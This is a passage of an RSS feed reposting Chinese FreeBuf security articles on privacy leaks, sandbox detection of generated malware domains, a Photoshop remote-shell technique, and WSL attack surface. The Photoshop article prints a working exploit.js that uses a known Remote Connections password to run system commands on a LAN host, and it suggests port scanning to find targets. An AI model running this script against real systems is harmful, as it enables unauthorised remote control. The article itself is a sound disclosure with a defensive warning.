给普通用户的精准理解带来一点困难。除此之外，用户条款中夹杂的&lt;b&gt;“可能”、“潜在”&lt;/b&gt;等词汇的存在，继续模糊了好不容易建立起来的一点概念。这些数据的使用状况，数据分析和挖掘的目标和最终的数据消费者，更是不得而知。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2c190926000b816af89f32682edce2d0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;502&quot;&gt;&lt;p&gt;即便一些用户是较为谨慎的——他们在选择应用服务的时候会考虑“数据泄漏”带来的影响，但他们能够避开的更多只是一些声誉差的，已经发生过数据泄漏的企业。通常情况下，规模较大的企业能够享有更好的声誉和用户口碑，获得多数人的信任和青睐。&lt;/p&gt;&lt;p&gt;如果这家服务商的大名家喻户晓，人人都在使用它的APP，更多的用户就能放心大胆的进行注册，然后开始使用这款服务。但显然，这仍然只是“一厢情愿”的信任，大的企业也可能存在安全漏洞和疏忽。仅在过去的一年中，就继续曝出了大大小小的数据泄漏事件，其中也有不少知名大企业的身影。&lt;/p&gt;&lt;blockquote&gt;互联网巨头 Yahoo 数据泄漏：10亿账号的用户姓名、生日、邮箱地址、密码、电话、安全问题和答案全被泄露&lt;br&gt;美国三大信贷之一 Equifax 数据泄漏：超过 1.43 亿的美国用户数据泄漏，包括姓名，社保号码，出生日期，地址，及驾驶证信息；20.9 万用户的信用卡号，以及部分英国和加拿大用户信息。&lt;br&gt;移动出行 Uber 数据泄漏：5700 万乘客用户信息泄漏，5万名司机信息泄露。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;深度分析和机器学习在混淆隐私边界吗&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;积累足够全面的数据才能让有规律的随机事件，在大量重复出现的条件下，呈现出几乎必然的统计特性。&lt;/blockquote&gt;&lt;p&gt;随着政府的政策支持和公共部门积极进行数据整合，冗余数据中蕴含的战略和资产方面的价值逐渐浮出水面，企业纷纷着力于进行大数据技术研发与产品化。企业在应用数据进行决策和谋利的同时，仍然会不言而喻地使用用户的个人数据，使之在整合、关联和深度分析时受到隐私侵犯。 在当前数据科学和信息技术发展的过程中，隐私信息的界定正在变得不严格。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ee193d0f648f4e1990eef9f0fe82ab04_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;582&quot; data-rawheight=&quot;368&quot;&gt;&lt;p&gt;巨大的数据集之下，即便个人提供部分数据字段，也可能被得出一些隐秘的推测，并给用户带来风险。&lt;/p&gt;&lt;p&gt;2016年，上海交通大学的一篇机器学习论文《基于面部图像的自动犯罪概率推断》曾引起过争议。相同遭遇的还有2017年斯坦福大学公布的论文&lt;/p&gt;&lt;a href=&quot;https://osf.io/zn79k/&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-9c10c7af6aac3526539772ff269af9d6&quot; data-image-width=&quot;165&quot; data-image-height=&quot;165&quot; data-image-size=&quot;ipico&quot;&gt;&lt;br&gt;        Deep neural networks are more accurate than humans at detecting sexual orientation from facial images.&lt;br&gt;&lt;/a&gt;&lt;p&gt;，其中的 AI 算法已经能够通过个人的肖像照片识别同性恋，且准确率高达81%。&lt;/p&gt;&lt;p&gt;公开在社交网站及其他角落的相片信息中的肖像不存在隐私问题，但对于人脸图像数据的分析、存储和使用，隐私权问题依旧面临挑战。如果个人用户并不在意自己在各个角落的信息披露，认为网络空间仅仅是和普通公共场所一样，那么当处在隐私边界时，他们就容易遭到认知偏差的影响，比如过度低估个人信息的利用程度和数据价值。&lt;b&gt;只需要一些公开的信息，运用技术就可以对个人的情况进行推断、分类甚至“定价”和“特殊对待”。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-902ea81f4cbd7a9625f119a12b6c158c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;633&quot; data-rawheight=&quot;480&quot;&gt;&lt;p&gt;如今企业在技术层面的数据挖掘技术的演进、机器学习和深度学习算法的发展，都让数据利用效率和程度得到显著提升。特定的分析流程和算法有时很难进行描述和解释，服务运营商甚至在进行分析之前也不了解他们能够得到的结果。更多隐私问题甚至是在二次开发利用原始数据时才引发的，因此在法律监管上也存在难度。&lt;/p&gt;&lt;p&gt;隐私专家 John Diebold 曾前写过这样一句话，而这在不久之后的将来，这可能会成为现实。&lt;/p&gt;&lt;blockquote&gt;信息时代你留下的每一个字节，都会是构成隐私的血肉。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;隐私意识在觉醒，但是…&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2018年伊始时，大家的朋友圈都曾一度遭遇被“支付宝年度账单”和“网易云音乐”统治的时刻，随后当天就有用户揭露被安插在年度账单首页之中、必须签署的《用户隐私协议》。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0a100a715099b633dfb3a3a7fff1b600_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;439&quot;&gt;&lt;p&gt;细心用户发现了这行隐蔽的小字，并点开看了《用户协议》，但也许是因为个人意志还无法抗衡从众心理，又或许还是败给了自己的好奇心，最终绝大多数用户还是同意将自己的数据授权给了芝麻服务，开开心心地在朋友圈晒了支付宝年度截图。&lt;/p&gt;&lt;p&gt;可以发现人们的隐私意识虽然存在，但依然愿意用牺牲个人数据换取更好的网络生活，或者将安全和隐私的责任完全寄托在政府和网络服务商身上。2014年时，EMC在15个国家和地区进行了15000 用户的隐私保护调查，而调查结果依旧让人担忧。&lt;/p&gt;&lt;blockquote&gt;50%的用户遭遇过或大或小的数据泄漏&lt;br&gt;62%的用户并不会定期修改密码&lt;br&gt;33%的人不会修改社交网络上的隐私设置&lt;br&gt;39%的人不会对自己的移动设备设置密码&lt;/blockquote&gt;&lt;p&gt;而 2018 年 刚刚召开的Usenix Enigma 安全峰会上，谷歌工程师也在演讲时道出了谷歌用户的安全意识现状，可以看到情况并不乐观——尽管早在 7 年前谷歌就开始引入了两步验证（2FA）功能，但目前有效的谷歌账户中，少于 10% 的用户开启了两步验证功能对账户进行保护；而使用密码管理器的用户在整体仅占12%的比例。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-81950219af9d11ee2db3546e54d6563b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;648&quot; data-rawheight=&quot;399&quot;&gt;&lt;h2&gt;&lt;b&gt;安全、便利和隐私之争始终无法停歇&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;大数据时代的便利已经渗透进了我们生活的每个角落，更低的商品价格、更符合实时需求的产品和社会沟通度，要使用这些服务就会创建个人数据，而通过数据信息就总有办法辨析出个人的身份。&lt;/p&gt;&lt;p&gt;如果用户确实关心自己的隐私状况，不希望泄漏信息还是有一些简单的措施可以采纳：&lt;/p&gt;&lt;blockquote&gt;1. 避免连接公共WiFi，及时在所有设备上进行安全更新&lt;br&gt;2. 开启账户两步验证功能，安装密码管理器&lt;br&gt;3. 注意所有应用程序的权限设置&lt;br&gt;4. 斟酌填写真实信息，适当选择备用方式&lt;br&gt;5. 开启浏览器拒绝跟踪功能，及时清理 cookie&lt;br&gt;6. 适当使用匿名互联网服务&lt;/blockquote&gt;&lt;hr&gt;&lt;h2&gt;&lt;b&gt;FreeBuf 隐私安全文章推荐阅读&lt;/b&gt;&lt;/h2&gt;&lt;a href=&quot;http://www.freebuf.com/articles/database/142797.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-722b44268b083aca7e9724033d955a73&quot; data-image-width=&quot;600&quot; data-image-height=&quot;247&quot; data-image-size=&quot;180x120&quot;&gt;科技之殇：端到端加密究竟保护了谁？&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/160692.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-a439800f9a5ef19529a3f9037572782c&quot; data-image-width=&quot;690&quot; data-image-height=&quot;388&quot; data-image-size=&quot;180x120&quot;&gt;研究人员称HTML5可以被用来追踪网民 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/articles/terminal/152424.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-b9b5c5054751576a5900efa55a12352e&quot; data-image-width=&quot;690&quot; data-image-height=&quot;360&quot; data-image-size=&quot;180x120&quot;&gt;得到相机授权的iPhone APP可在你不知情的情况下偷偷拍照窃取隐私&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/152691.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-08fc8bc192ba49ffad25b8d033dd3a63&quot; data-image-width=&quot;690&quot; data-image-height=&quot;360&quot; data-image-size=&quot;180x120&quot;&gt;Firefox再次从Tor浏览器中借鉴了一个隐私保护功能 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/149646.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-8bca6f8bfeba16c47b073a2e0ffd6b2f&quot; data-image-width=&quot;690&quot; data-image-height=&quot;400&quot; data-image-size=&quot;180x120&quot;&gt;Signal 新探索：运用英特尔 SGX 加强联系人搜索功能的隐私安全&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/155139.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-b88f1203b4680ac03ecc12fbb60a4a30&quot; data-image-width=&quot;690&quot; data-image-height=&quot;388&quot; data-image-size=&quot;180x120&quot;&gt;Google无视用户隐私设置，暗中收集Android位置数据 - FreeBuf.COM | 关注黑客与极客&lt;/a&gt;&lt;a href=&quot;http://www.freebuf.com/news/148292.html&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;v2-14f0f5da2d17c9f79587ece2c21ed8ef&quot; data-image-width=&quot;690&quot; data-image-height=&quot;251&quot; data-image-size=&quot;180x120&quot;&gt;你的终端是安全的吗？iTerm2 中可能通过 DNS 请求泄漏隐私信息&lt;/a&gt;&lt;p&gt;&lt;b&gt;*本文作者Elaine，转载请注明FreeBuf.COM&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2018-01-22-33184183</guid>
<pubDate>Mon, 22 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>自动化沙箱打造之“关于XShell我有话说”</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-08-18-28609222.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28609222&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;最近XShell很是火了一把，每个安全厂商都在发通告，都在分析，反正就是百花齐放，在这里我想做一个总结，从前些时间的勒索软件到今天的xshell，其实我们可以看到共同点：&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;那就是根据特定的算法生成伪随机的域名，当然这些域名都是未注册的，这样就有一个好处就是不容易暴露，让人找不到源头，并且由于域名无法解析导致后面的流程无法执行，等到感染量大后，再注册域名，这样就可以在几天之内做很惊人的事情。&lt;/blockquote&gt;&lt;p&gt;那么对于这种情况怎么防止呢？先看看自动化沙箱的其中一个功能吧，沙箱不太完善，最近在修改中，先看看结果吧。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d8a1f0b414c1643e38db232e3473bf79_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;317&quot;&gt;&lt;p&gt;看isReg栏目，当 reg=1的时候 说明域名已经被注册，当reg=0的时候 说明域名没有被注册 ，如果reg=0，那么就要注意了，我们又遇到那种先随机生成域名，让病毒感染一段时间在操作的事情了。&lt;/p&gt;&lt;h2&gt;详细实现步骤&lt;/h2&gt;&lt;p&gt;第一步：沙箱客户端的功能之一 基于wpcap开发了一个抓dns包的工具&lt;/p&gt;&lt;p&gt;打开这个工具&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5515eaf0d38ff7380df1b2bdec93c410_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;342&quot;&gt;&lt;p&gt;第二步：运行特定软件&lt;/p&gt;&lt;p&gt;我这里选择xshell，蹭蹭热度&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;//2017.8%E6%9C%88%E4%BB%BD%E7%9A%84&quot;&gt;//2017.8月份的&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b69aae926ea9327a2e0cb9fe302ecc24_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;463&quot;&gt;&lt;p&gt;现在我修改一下时间2016.12&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4fe603f2190b527387b1824f2df27924_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;275&quot;&gt;&lt;p&gt;第三步：工具会给域名提交到沙箱网站上，看数据库设计&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-54c372ae11b00bb09ee15babcbc91435_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;325&quot;&gt;&lt;p&gt;第四步：当查看沙箱网站首页的时候，调用域名查询接口，这里我是调用阿里云的dns查询接口&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3bbe7da2e86ddd73a57e989aa23f9328_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;261&quot;&gt;&lt;p&gt;有人会说我用wireshark抓包，再到注册域名的网站查询一下，可以，但是你会很浪费时间，并且效率不高，现在都是自动化了。&lt;/p&gt;&lt;h2&gt;总结一下&lt;/h2&gt;&lt;p&gt;现在木马慢慢开始倾向于域名先生成，再注册的形式，那么我们手上的工具能否与时俱进啦？&lt;/p&gt;&lt;p&gt;ps：对这个项目感兴趣我们私下交流，需要源码，发私信给我，我这里就不过多的讲解源代码了，思路为上。&lt;/p&gt;&lt;p&gt;*本文作者：刀郎，&lt;a href=&quot;http://%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E6%9D%A5%E8%87%AAFreeBuf.COM&quot;&gt;转载请注明来自FreeBuf.COM&lt;/a&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2017-08-18-28609222</guid>
<pubDate>Fri, 18 Aug 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何把Photoshop改造成远程控制工具（RAT）来利用</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-08-09-28419023.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28419023&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者在本文中通过对Photoshop远程连接功能的改造利用，最终实现了对开启远程连接功能的Photoshop端操作系统的接管控制。&lt;/p&gt;&lt;h2&gt;Photoshop远程连接功能说明&lt;/h2&gt;&lt;p&gt;Photoshop中有一个名为远程连接（Remote Connections）的可选功能，该功能默认是关闭的，但如果你启用该功能并设置密码后，任何知晓密码的人就可以远程接入到你电脑的Photoshop服务端。如下开启画面：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bc3e858ce3019ff3db9920677268c0d9_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;353&quot;&gt;&lt;p&gt;正常用户利用该功能，来实时预览不同PS文件在iPad或手机等远程设备上的实际设计外观样式，该远程预览功能需要手机等移动终端安装如PS Playon和Skala Preview等第三方APP来实现连接。如Skala Preview：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b5771364f19736931d29e426bf2c4f1b_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;361&quot;&gt;&lt;p&gt;该远程连接功能基于Photoshop的JSX脚本实例。JSX属Photoshop的宏脚本，由Javascript语言编写，以实现Photoshop的图片加载、颜色渲染、矢量绘制和导出等功能，可&lt;a href=&quot;http://wwwimages.adobe.com/content/dam/Adobe/en/devnet/photoshop/pdfs/photoshop-cc-scripting-guide-2015.pdf&quot;&gt;点此查看&lt;/a&gt;JSX的相关编写规范和可用接口。&lt;/p&gt;&lt;p&gt;另外，Adobe提供了一个开源库内核生成器来建立该远程连接，所以如果您对其中的协议细节有兴趣，也可&lt;a href=&quot;https://github.com/adobe-photoshop/generator-core/blob/master/lib/ps_crypto.js#L51&quot;&gt;点此查看&lt;/a&gt;。当开启远程连接后，Photoshop将会对49494端口进行监听：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ netstat -an | grep 49494
tcp4 0 0 *.49494 *.* LISTEN&lt;/code&gt;&lt;p&gt;以下代码为与远程Photoshop服务端用来进行身份验证交互的代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;const core = require(&quot;generator-core/lib/generator&quot;)
const options = {
    host: &#39;192.168.1.123&#39;,
    password: &#39;password&#39;,
    port: 49494
}
const generator = core.createGenerator()
generator.start(options).done(() =&amp;gt; {
    generator.evaluateJSXString(&#39;alert(&quot;Hello&quot;)&#39;).then(() =&amp;gt; generator.shutdown())
})&lt;/code&gt;&lt;p&gt;对此，我曾尝试利用以下app.system方法来调用系统命令：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;alert(app.system(“id”))&lt;/code&gt;&lt;p&gt;但遗憾的是其返回值却是一些退出状态码，不是标准的命令输出内容。经过研究，我发现Photoshop的JSX脚本具备系统访问接口，所以，这样一来，我们可以把其标准输出内容（stdout）重定向到一个临时文件中，之后，就可以对该文件进行读取。如下所示：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;var tmpFile = Folder.temp + &#39;output.txt&#39;;
app.system(&quot;id &amp;gt; &quot; + tmpFile);
var stdout = new File(${tmpFile});
stdout.open(&#39;r&#39;);
stdout.encoding = &quot;UTF-8&quot;;
var content = stdout.read();
stdout.close();
stdout.remove();
alert(content);&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d14d18dd97cc301c214f531b82dbcea0_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;531&quot;&gt;&lt;h2&gt;Photoshop RAT 改造成型&lt;/h2&gt;&lt;p&gt;因此，我可以在上述身份验证代码中作出如下修改，通过用户名密码方式登录远程Photoshop服务端，之后，再利用JSX脚本接口间接执行Photoshop服务端系统命令，实现对远程Photoshop服务端系统的直接接管控制。以下为exploit代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;exploit.js:
const readline = require(&#39;readline&#39;)
const backdoor = require(&quot;generator-core/lib/generator&quot;)
const options = {
  host: &#39;192.168.0.101&#39;,
  password: &#39;password&#39;,
  port: 49494,
}
console.info(&#39;Establishing connection to &#39; + options.host)
const generator = backdoor.createGenerator()
generator.start(options).done(() =&amp;gt; {
  const rl = readline.createInterface({input: process.stdin, output: process.stdout, prompt: &#39;&amp;gt; &#39;})
    .on(&#39;line&#39;, line =&amp;gt; {
      let command = line.trim()
      let tmpFile = `Folder.temp + ${JSON.stringify(Math.random() + &#39;.txt&#39;)}`
      let jsx = `
        app.system(&quot;${command} &amp;gt; &quot; + ${tmpFile});
        var stdout = new File(${tmpFile});
stdout.open(&#39;r&#39;);
        stdout.encoding = &quot;UTF-8&quot;;
        var content = stdout.read();
        stdout.close();
        stdout.remove();
        content
        `
      generator.evaluateJSXString(jsx).then(output =&amp;gt; {
        console.log(output)
        rl.prompt()
      })
    })
    .on(&#39;SIGINT&#39;, () =&amp;gt; {
      console.log(&#39;bye&#39;)
      generator.shutdown()
      rl.close()
    })
  console.log(&#39;Remote photoshop shell&#39;)
  rl.prompt()
})&lt;/code&gt;&lt;p&gt;成功利用后，读取远程Photoshop服务端操作系统密码：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-af6eedaf4ed1f9e3477f134eac624533_r.jpg&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;311&quot;&gt;&lt;h2&gt;影响分析&lt;/h2&gt;&lt;p&gt;在内网中，你可以通过49494端口扫描或组播DNS”_photoshopserver.tcp”抓包来探测一些开启远程连接功能的Photoshop服务端，之后利用以上exploit.js进行把玩。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7cd77c2e3313ac86c639b83ea95b0354_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;302&quot;&gt;&lt;p&gt;该功能的此种RAT方式利用，&lt;b&gt;前提必须知晓对方Photoshop服务远程连接密码，因此并不属于漏洞范畴。基于此，请谨慎开启你的Photoshop远程连接功能，或严格保存你的Photoshop远程连接密码，否则，你的操作系统有可能被不怀好意之人远程控制。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;*参考来源：&lt;a href=&quot;https://medium.com/0xcc/how-to-turn-photoshop-into-a-remote-access-tool-805485a9480&quot;&gt;medium&lt;/a&gt;，作者：Clouds，转载请注明来自&lt;a href=&quot;http://www.freebuf.com&quot;&gt;FreeBuf.COM&lt;/a&gt;   &lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2017-08-09-28419023</guid>
<pubDate>Wed, 09 Aug 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>浅谈Windows 10中藏着的那个Linux</title>
<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-06-21-27497774.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27497774&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;早在去年8月份，eWEEK曾经发表过一篇文章，题为《藏于Windows 10之中Linux内核风险》。我觉得这个话题还是挺有意思的，这里将这篇文章与列位分享。&lt;/blockquote&gt;&lt;p&gt;早在去年8月份，eWEEK曾经发表过一篇文章，题为《藏于Windows 10之中Linux内核风险》。这篇文章实际上是对Crowdstrike首席架构师Alex Ionescu在去年Black Hat USA安全大会上发言的简单总结。我觉得这个话题还是挺有意思的，我在去年Black Hat USA的&lt;a href=&quot;http://www.freebuf.com/news/111125.html&quot; data-editable=&quot;true&quot; data-title=&quot;总结文章&quot;&gt;总结文章&lt;/a&gt;中也提到了这个议题，不过可惜未能亲临现场听教，这里将这篇文章添油加醋后与列位分享，仅停留在理论和嘴炮上，但可作为各位深入研究的切入点。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-70960a6db44ac5ebbba031af9de20727_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;460&quot;&gt;&lt;h2&gt;Windows 10中的Linux&lt;/h2&gt;&lt;p&gt;微软去年3月份在Build大会上宣布“将Ubuntu Linux的一些能力带给微软用户”。其实最初Windows 10系统中引入Bash就已经让不少人感觉到惊讶了（Bash on Ubuntu on Windows），不过Bash对很多人来讲也是福音，比如能运行GUI Linux应用了。但实际情况还不止于此，微软去年其实已经向大众明确解释了Windows 10中的Linux子系统。&lt;/p&gt;&lt;p&gt;这里多嘴一句，似乎在纳德拉成为微软CEO之后，其行事风格已经发生了极大转变，拥抱Linux不过是其中一个事件罢了——且拥抱Linux这件事并不只是通过在Windows中塞个Linux实现的，似乎前两年微软在培训体系中已经增加了更多针对Linux工程师的联合认证，而且是和Linux基金会合作的。&lt;/p&gt;&lt;p&gt;微软首席软件架构负责人Deepu Thomas说，其中Linux子系统就是微软Windows Kernel团队打造的，而且绝不只是加个解释层或虚拟机。据说这个Windows Subsystem for Linux几年前就已经诞生了，针对的是NT内核，彼时是期望以此支持POSIX和OS/2。&lt;/p&gt;&lt;p&gt;Thomas说这是用户模式（或者叫用户态，user mode）Linux二进制代码和Windows内核组件之间，”the magic happens”。微软令Linux系统调用能够直接往Windows内核，Pico进程（有关Pico详情可见&lt;a href=&quot;https://blogs.msdn.microsoft.com/wsl/2016/05/23/pico-process-overview/&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Pico Process Overview&quot;&gt;Pico Process Overview&lt;/a&gt;）中放了未修改版（原话就是未修改版）的Linux二进制程序。他稍稍解释了Windows Subsystem for Linux（简称WSL）的组成：&lt;/p&gt;&lt;p&gt;WSL由一系列组件组成，可让原生的Linux ELF64二进制程序在Windows之上运行。它包含用户态和内核态组件。主要组成部分包括：&lt;/p&gt;&lt;blockquote&gt;- 用户模式管理服务，用于处理Linux实例生命周期；&lt;br&gt;- Pico Provider驱动（lxss.sys, lxcore.sys），通过解释Linux系统调用来模拟Linux内核；&lt;br&gt;- Pico进程，放置原版用户模式Linux（e.g. /bin/bash）&lt;/blockquote&gt;&lt;p&gt;当然了，要将这么个子系统塞进Windows中，并非一个简单的进程就能搞定的。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8c349e1f868c61c8bbf9ae960b2e3824_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;318&quot;&gt;&lt;p&gt;WSL通过在Windows NT内核之上虚拟Linux内核接口，来执行未修改的Linux ELF64二进制程序。内核接口之一就是系统调用（syscall）。系统调用就是内核提供的服务，可从用户模式调用。Linux内核与Windows NT内核都向用户模式提供大量系统调用，但两者语义不同，且并不直接兼容。比如说，Linux内核包括如fork、open、kill之类，而Windows NT内核则相应的有NtCreatProcess、NtOpenFile、NtTerminateProcess。&lt;/p&gt;&lt;p&gt;WSL包含内核模式驱动（lxss.sys和lxcore.sys），这些驱动负责处理Linux系统请求调用与Windows NT内核协调。它们并不包含Linux内核的代码，而采用Linux兼容内核界面的clean room implementation。在原生Linux中，用户模式可执行程序进行系统调用时，是由Linux内核处理。而在WSL中，可执行程序进行系统调用，Windows NT内核要将请求转发给lxcore.sys。lxcore.sys将Linux系统调用解释为相应的Windows NT调用，后者再依次处理。在没有合理对应的情况下，Windows内核模式驱动需要直接服务于请求。&lt;/p&gt;&lt;p&gt;感兴趣的同学可以点击这里作更多了解：&lt;a href=&quot;https://blogs.msdn.microsoft.com/wsl/2016/04/22/windows-subsystem-for-linux-overview/&quot; data-editable=&quot;true&quot; data-title=&quot;Windows Subsystem for Linux Overview&quot;&gt;Windows Subsystem for Linux Overview&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;增加的攻击面&lt;/h2&gt;&lt;p&gt;去年的Black Hat USA大会之上，Crowdstrike首席架构师Alex Ionescu做了个议题分享，名字就叫“Windows 10中藏着的Linux内核”。eWEEK后来也对他单独做了采访，Ionescu因此分享了更多细节。&lt;/p&gt;&lt;p&gt;他说早在beta测试期间，他就将发现的安全问题反馈给了微软，某些漏洞已经修复。不过他强调说，现如今的Windows系统令企业组织有了更大的攻击面，这是企业组织需要去了解的。&lt;/p&gt;&lt;p&gt;Ionescu表示：“在某些情况下，Windows系统中的Linux环境，由于兼容性问题会更不安全。Windows应用有很多方法针对Windows系统中的Linux应用植入代码、篡改内存，形成新的威胁。”&lt;/p&gt;&lt;blockquote&gt;“这样一来，你就有了个双头猛兽，既能对Linux做些小动作，也能对Windows进行攻击。”&lt;/blockquote&gt;&lt;p&gt;前面已经提到，Windows系统中的这个Linux并不是运行在Hyper-V虚拟机里面的，而是运行在原生硬件之上——Ionescu的用词说可以获得所有的性能和系统访问，因此扩大攻击面是必然的。而且Windows系统文件也对应到Linux系统，Linux访问相同的文件和路径。&lt;/p&gt;&lt;p&gt;另外WSL的更新机制也是Ionescu比较关注的——Windows系统中可设定计划任务，运行Apt-Get Linux命令，针对用户态作包升级。实际上，微软并没有真的用Ubuntu Linux内核，只是用户空间工具和应用。&lt;/p&gt;&lt;blockquote&gt;“内核是微软自家的实施方案，通过常规的Windows Update更新机制来更新。”&lt;/blockquote&gt;&lt;p&gt;除此之外，Ionescu提到的问题还包括微软针对Windows应用的白名单服务AppLocker，对Linux应用而言是没用的。也就是说，如果某家企业在系统中采用Linux，那么Linux应用的运行是不会经过AppLocker检查的。&lt;/p&gt;&lt;p&gt;这里我也没有掌握更多的资料可供具体分享（毕竟我向来都是个只在意理论，而对实操毫无兴趣的人，具体请看我的另一个专栏：周三特别行动小组）。在攻击面增加之外，防范方法当然还是要提一下——网络防火墙设备检查流量还是有效的；另外虽然用户的传统反病毒产品可能面对此类问题时不会有什么效果，但基于行为的安全软件还是能够发现IoC。&lt;/p&gt;&lt;p&gt;不过Ionescu认为，这方面的威胁应该短期内不会太严重，毕竟当前WSL还很新，也并没有广泛部署。“攻击者一般不会在意最新的事物，毕竟其对市场影响力有限。不过随着功能采用率的增加，还是可能会成为更具吸引力的攻击向量。”（最后容我吐槽下，不知道究竟是谁把attack vector最先翻译成了攻击向量，小学语文真的是…好了不说了…）&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-408a0615221a97d4a78f4ff162ce26b0_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;457&quot;&gt;&lt;p&gt;最后的最后，其实我一直很想吐槽微软近两年出现的各种短命且奇葩项目，比如说Project Astoria——在Windows 10 Mobile中塞个Android——其实Insider计划一度是出现过塞进Android的编译版本的（像追逐iOS的Project Islandwood计划则更昙花一现了）。是不是感觉跟Win10塞Linux也没差？这是其它话题了，而微软的脑回路近两年在纳德拉的影响下已经越来越曲折，就好像Windows on ARM一样（高通在Computex大会上已宣布支持完整版Windows）…这节奏是包罗万象的意思吗？攻击面？？？What…&lt;/p&gt;&lt;p&gt;* 参考来源：&lt;a href=&quot;https://blogs.msdn.microsoft.com/wsl/2016/04/22/windows-subsystem-for-linux-overview/&quot;&gt;微软&lt;/a&gt;，&lt;a 